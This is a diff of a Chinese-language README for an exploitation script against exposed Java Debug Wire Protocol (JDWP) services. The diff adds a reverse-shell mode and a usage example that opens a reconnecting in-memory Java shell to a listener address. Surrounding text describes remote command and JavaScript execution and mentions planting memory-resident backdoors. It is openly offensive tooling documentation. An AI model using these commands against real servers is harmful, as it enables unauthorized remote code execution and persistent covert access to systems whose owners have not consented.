@@ -14,7 +14,8 @@
 
 ### 用法
 ```
-usage: jdwp-codeifier.py [-h] -t IP [-p Port] [-m Mode] -c Command/Code
+usage: jdwp-codeifier.py [-h] -t IP [-p Port] [-m Mode] [-c Command/Code]
+                         [-a Address] [-l life]
 
 Advanced exploitation script for JDWP by @leixiao, base on @_hugsy_, @Lz1y,
 @r3change
@@ -23,8 +24,11 @@ optional arguments:
   -h, --help       show this help message and exit
   -t IP            Remote target IP (default: None)
   -p Port          Remote target port (default: 8000)
-  -m Mode          command/code (default: code)
+  -m Mode          command/code/rshell (default: code)
   -c Command/Code  Command or JavaScript Code (default: None)
+  -a Address       The address of reverse shell (default: None)
+  -l life          The survival time (minute) of the shell when unable to
+                   connect to the server (default: 1)
 ```
 
 ### 命令执行
@@ -45,6 +49,15 @@ python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m code -c 'new java.util.Scanner
 
 
 通过JS代码还可以动态定义类，加载外部类，插入内存马等等... 各位就自己发挥了
+
+## 反弹Java内存Shell
+```
+python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m rshell -a 172.17.0.2:8080 -l 0.1
+# -a 指定接收shell的地址
+# -l 指定shell与服务器连接不上时的最大存活时间（分钟）（每隔5秒自动重连）
+```
+![Alt text](README/img2.png)
+
 
 
 ## 免责声明
